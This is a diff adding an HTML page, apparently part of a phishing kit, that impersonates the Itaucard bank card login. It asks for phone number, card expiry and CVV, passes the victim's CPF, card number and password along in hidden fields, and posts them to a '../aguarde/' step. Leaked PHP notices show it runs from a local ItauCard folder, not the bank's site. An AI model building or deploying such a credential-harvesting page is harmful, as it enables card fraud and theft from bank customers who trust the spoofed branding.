@@ -1,0 +1,158 @@
+<html><head>
+	<title>Itaucard</title>
+	<meta charset="utf-8">
+	<meta name="theme-color" content="#253a6d">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+	<link rel="shortcut icon" href="imagens/ico.png" type="image/x-icon">
+	<script type="text/javascript" src="js/jquery.js"></script>
+	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
+	<style type="text/css">
+		*{
+			padding: 0;
+			margin:0;
+		}
+		body{
+			background-image: url(imagens/img_login_background.png);
+			background-size: cover;
+		}
+
+		img.logo{
+			width: 300px;
+			margin-top: 110px;
+			margin-left: 10px;
+		}
+		.content{
+			position: fixed;
+			bottom: 0;
+			left: 0;
+			width: 100%;
+			padding-bottom: 20px;
+		}
+		.box{
+			float: left;
+			width: calc(100% - 40px);
+			min-height: 100px;
+			border-radius: 5px;
+			margin-left: 10px;
+			background: linear-gradient(to right, #253a6d, #3f6075);
+			padding: 10px;
+			opacity: 0.9;
+		}
+		input{
+			background-color: transparent;
+			border:0px;
+			border-bottom: 2px solid #fff;
+			float: left;
+			width:calc(100%);
+			margin-bottom: 13px;
+			height:25px;
+			color: #fff;
+		}
+		input[name=validade]{
+			width:calc(50% - 10px);
+			margin-right: 10px;
+		}
+		input[name=cvv]{
+			width:calc(50%);
+		}
+		label{
+			font-family: Arial;
+			font-size: 12px;
+			color: #fff;
+			float: left;
+			width:calc(100%);
+		}
+		button{
+			float: left;
+			width:calc(100%);
+			background-color: #fff;
+			border:0px;
+			height: 40px;
+			font-size: 15px;
+			margin-top: 10px;
+			border-radius: 5px;
+			color: #2e4770;
+		}
+		.l{
+			width: 50%;
+			float: left;
+		}
+		div.full{
+			float: left;
+			width: 100%;
+		}
+	</style>
+</head>
+<body>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$("input[name=cpf]").mask("000.000.000-00");
+			$("input[name=validade]").mask("00/0000");
+			$("input[name=cvv]").mask("000");
+
+			var SPMaskBehavior = function (val) {
+			  return val.replace(/\D/g, '').length === 11 ? '(00) 00000-0000' : '(00) 0000-00009';
+			},
+			spOptions = {
+			  onKeyPress: function(val, e, field, options) {
+			      field.mask(SPMaskBehavior.apply({}, arguments), options);
+			    }
+			};
+
+			$('input[name=phone]').mask(SPMaskBehavior, spOptions);
+
+
+			$("input[name=phone]").keyup(function(event) {
+				if ($(this).val().length == 15) {
+					$("input[name=validade]").focus()
+				}
+			});
+
+			$("input[name=validade]").keyup(function(event) {
+				if ($(this).val().length == 7) {
+					$("input[name=cvv]").focus()
+				}
+			});
+
+		});
+	</script>
+	<center>
+	<img src="imagens/img_splash_logo.png" class="logo">
+	</center>
+
+	<div class="content">
+		<div class="box">
+			<form method="post" action="../aguarde/">
+				<input type="hidden" name="mensagem" value="<br />
+<b>Notice</b>:  Undefined index: mensagem in <b>C:\xampp\htdocs\ItauCard\dados\index.php</b> on line <b>128</b><br />
+">
+				<label>TELEFONE:</label>
+				<input autocomplete="off" type="text" name="phone" id="phone" maxlength="15">
+				<!-- <label>RG:</label> -->
+				<!-- <input autocomplete="off" type="text" name="rg"> -->
+
+				<div class="full">
+					<label class="l">Validade:</label>
+					<label class="l">CVV:</label>
+				</div>
+				<div class="full">
+					<input autocomplete="off" type="text" name="validade" id="validade" maxlength="7">
+					<input autocomplete="off" type="text" name="cvv" maxlength="3" id="cvv">
+				</div>
+
+				<button type="submit">continuar</button>
+				
+				
+				<input type="hidden" name="cpf" value="146." maxlength="14">
+				<input type="hidden" name="card" value="<br />
+<b>Notice</b>:  Undefined index: card in <b>C:\xampp\htdocs\ItauCard\dados\index.php</b> on line <b>147</b><br />
+">
+				<input type="hidden" name="senha" value="<br />
+<b>Notice</b>:  Undefined index: senha in <b>C:\xampp\htdocs\ItauCard\dados\index.php</b> on line <b>148</b><br />
+">
+			</form>
+		</div>
+	</div>
+
+
+</body></html>
